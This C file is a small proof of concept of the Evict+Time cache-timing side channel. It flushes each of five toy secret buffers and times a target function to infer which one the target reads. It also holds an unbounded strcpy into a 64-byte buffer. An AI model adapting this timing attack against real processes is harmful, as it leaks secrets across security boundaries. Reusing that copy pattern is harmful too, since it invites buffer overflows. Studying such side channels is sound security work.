#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "x86.h"

#define TRIALS (10000)

#define SECRETS 5

char secret1[4096] = "This is secret number one.";
char secret2[4096] = "This is secret number two.";
char secret3[4096] = "This is secret number three.";
char secret4[4096] = "This is secret number four.";
char secret5[4096] = "This is secret number five.";

char *secrets_table[SECRETS] = {secret1, secret2, secret3, secret4, secret5};

void run_target(void)
{
	char used_buffer[64];
	strcpy(used_buffer, secrets_table[3]);
}

void flush_secrets(void)
{
	for(int i = 0; i < SECRETS; i++)
		clflush(secrets_table[i]);
}

unsigned long pre_attack(void)
{
	unsigned long time1, time2;
	unsigned long baseline = 0;

	for(int i = 0; i < TRIALS; i++) {
		// Bring the cache into a known state
		flush_secrets();

		// Run target to load its working set
		run_target();

		// Working set is now loaded
		time1 = rdtsc();
		run_target();
		time2 = rdtsc();
		baseline += time2 - time1;
	}

	baseline /= TRIALS;
	return baseline;
}

int main(void)
{
	unsigned long time1, time2;
	unsigned long baseline, secret_time;
	printf("*** Evict+Time POC started***\n");

	baseline = pre_attack();
	printf("Baseline execution time is %lu\n", baseline);

	// Run again the target evicting a part of the set
	for(int i = 0; i < SECRETS; i++) {
		secret_time = 0;

		for(int j = 0; j < TRIALS; j++) {
			clflush(secrets_table[i]);
			time1 = rdtsc();
			run_target();
			time2 = rdtsc();

			secret_time += (time2 - time1);
		}

		secret_time /= TRIALS;
		if(secret_time > baseline)
			printf("Target is likely using secret %d\n", i);
	}


}
